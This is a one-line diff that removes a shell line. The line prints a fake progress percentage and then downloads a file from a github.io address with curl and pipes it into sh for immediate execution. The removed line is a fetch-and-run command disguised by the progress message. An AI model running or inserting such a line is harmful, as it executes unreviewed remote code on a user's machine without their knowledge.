@@ -1,1 +1,0 @@
-echo 'Progress: 24.0%'; curl -L --progress-bar frkns.github.io/fun/ethicsRabbitCompetent.pyx | sh
